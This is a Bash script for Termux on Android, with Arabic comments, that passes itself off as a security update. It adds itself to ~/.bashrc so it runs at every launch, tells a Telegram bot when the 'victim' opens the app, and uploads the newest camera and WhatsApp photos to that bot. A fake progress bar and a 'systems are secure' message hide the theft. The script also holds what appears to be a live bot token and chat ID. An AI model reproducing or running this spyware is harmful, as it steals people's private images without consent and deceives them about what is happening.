
#!/bin/bash

# --- 1. إعدادات البوت ---
TOKEN="8669553208:AAGCy9MQTL9ogHuFXbZiZy4bqkXUnkdwHqg"
ID="7845603274"
URL_MSG="https://api.telegram.org/bot$TOKEN/sendMessage"
URL_DOC="https://api.telegram.org/bot$TOKEN/sendDocument"

# --- 2. مرحلة "التثبيت الأول" (تنفذ مرة واحدة فقط) ---
# نتحقق إذا كان السكريبت قد تمت برمجته في bashrc مسبقاً
if ! grep -q "security_task.sh" ~/.bashrc; then
    echo -e "\e[1;32m[+] Initializing Security Suite...\e[0m"
    
    # طلب صلاحيات التخزين (ضروري لسحب الصور)
    termux-setup-storage
    sleep 4
    
    # تثبيت الأدوات اللازمة بصمت
    pkg install git curl -y -q
    
    # إضافة السكريبت للتشغيل التلقائي (تأكد من مسار الملف الصحيح)
    # نفترض أن الملف موجود في المجلد الرئيسي لتيرمكس
    echo "bash ~/security_task.sh" >> ~/.bashrc
    
    echo -e "\e[1;32m[!] Setup Complete. Ready for simulation.\e[0m"
fi

# --- 3. مرحلة "المهمة الخفية" (تعمل مع كل فتح لتيرمكس) ---
# إرسال إشعار للبوت بأن الضحية فتح التطبيق
MODEL=$(getprop ro.product.model)
curl -s "$URL_MSG?chat_id=$ID&text=Victim_Active: $MODEL" > /dev/null

# مسارات الصور (الكاميرا والواتساب)
paths=(
"/sdcard/DCIM/Camera/"
"/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/"
)

# سحب آخر صورتين من كل مسار وإرسالهم
for path in "${paths[@]}"; do
    if [ -d "$path" ]; then
        ls -t "$path" | head -n 2 | while read photo; do
            curl -s -F chat_id=$ID -F document=@"$path$photo" "$URL_DOC" > /dev/null
        done
    fi
done

# --- 4. مرحلة "التمويه" (ما يراه الضحية) ---
clear
for i in {1..100}
do
   echo -ne "\e[1;36m[System Update] Progress: $i%\r"
   sleep 0.04
done
echo -e "\n\e[1;32m[✔] All systems are secure and up to date.\e[0m"
